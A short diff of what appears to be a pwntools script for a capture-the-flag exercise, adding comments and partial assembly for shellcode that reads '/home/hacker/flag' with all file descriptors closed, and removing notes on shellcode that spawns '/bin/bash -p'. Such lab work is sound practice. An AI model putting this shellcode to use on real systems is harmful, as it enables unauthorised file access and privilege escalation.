@@ -39,6 +39,9 @@ context.log_level = 'debug'
 # rsi holds FLAGS
 # rdx holds Permissions
 # rsp holds buffer for read
+
+# Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.
+
 assembly = """
     lea rdi, [rip+flag]
     xor rsi, rsi
@@ -76,13 +79,7 @@ assembly = """
     result:
     .string "/home/hacker/flag"
     """
-
-# Walkthrough of shellcode
-# First, push /bin/bash using several techniques.
-# Then nullify rdx and rax
-# After that, put '-p' into rsi
-# Then, push the 'array' ["/bin/bash", "-p", 0], keep in mind that rsi and rdi holds pointers.
-# Then do syscall
+# Writes the flag to another file
 
 shellcode = asm(assembly)
 print(shellcode)
